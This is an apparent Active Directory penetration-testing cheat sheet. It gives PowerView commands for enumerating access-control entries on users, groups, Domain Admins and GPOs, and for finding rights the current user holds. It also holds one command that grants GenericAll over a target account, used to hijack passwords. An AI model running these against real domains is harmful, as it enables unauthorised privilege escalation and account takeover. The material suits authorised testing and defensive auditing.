---
layout: page
title: "# ACL's / ACE's / DACL's"
permalink: /ad_cheatsheets/acl_ace_dacl
---

# ACL's / ACE's / DACL's

## Enum own user

```powershell
#PowerView
Get-ObjectAcl -Identity %name%
```

## Enum ACL All users

```powershell
#PowerView
Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs  | select IdentityReference, ActiveDirectoryRights
```

## Enum ACL own users, convert SID to readable name

```powershell
#PowerView
Get-ObjectAcl -Identity %name% -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_}
```

## Enum all ACE's of all Users - Resolve SID - Filter on ACE's that contain our surrent username

```powershell
#PowerView
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

#Check for GenericAll OR WriteDacl OR ForceChangePassword OR AllExtendedRights rights to change user passwords!

## Enum all Domain Groups - Current User has explicit access rights - Resolve SID

```powershell
Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

## Enum ACL For DC

```powershell
#PowerView
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | select ObjectDN, ActiveDirectoryRights
```

## Enum ACL's For All GPO's

```powershell
#PowerView
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}
```

## Checking For mody rights/permissions For RDPUsers

```powershell
#PowerView
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "RDPUsers"}
```

## Add GenericAll access to user on another account when WriteDacl right is granted

```powershell
Add-DomainObjectAcl -TargetIdentity %targetuser% -PrincipalIdentity %usertogetright% -Rights All
```

## SID Converion

Convert SID back to readable name

```powershell
#PowerView
ConvertFrom-SID S-1-5-21-3776646582-2086779273-4091361643-553
```

## Resources

[Abusing Active Directory ACLs/ACEs](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
